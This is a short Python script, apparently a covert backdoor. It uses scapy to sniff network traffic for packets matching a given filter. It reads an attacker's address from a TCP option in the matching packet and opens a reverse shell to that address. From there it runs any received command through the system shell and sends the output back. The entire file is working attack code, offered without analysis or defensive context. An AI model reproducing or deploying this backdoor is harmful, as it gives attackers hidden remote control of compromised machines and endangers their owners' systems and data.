#!/usr/bin/python
import sys
import subprocess
from scapy.all import *
from threading import Thread

berkley_packet_filter = ''

def listen():
        sniff(iface="eth0",filter=berkley_packet_filter, prn=open_shell)

def open_shell(pkt):
	try:
		connect_to = str(pkt[TCP].options[0][1]).strip()
		
		reverse_shell(connect_to)
		
		#reverse_thread = Thread(target=reverse_shell,args=(connect_to))
		#reverse_thread.start()
	except:
		pass
	
def reverse_shell(connect):
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect_target = connect.split(':')
	sock.connect((connect_target[0],int(connect_target[1])))
	sock.send('Have Fun!')
	while True:
		incoming = sock.recv(2048)
		# If the user sends the disconnect command then break out of the loop
		if incoming.lower() == 'disconnect':
			break
		#Send the command
		process = subprocess.Popen(incoming, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)

		#Read the results
		results = process.stdout.read() + '\r\n' + process.stderr.read()

		#Send the output back
		sock.send(results)

	sock.close()



berkley_packet_filter = sys.argv[1]

#Start listener
listener_thread = Thread(target=listen,args=())

listener_thread.start()
listener_thread.join()


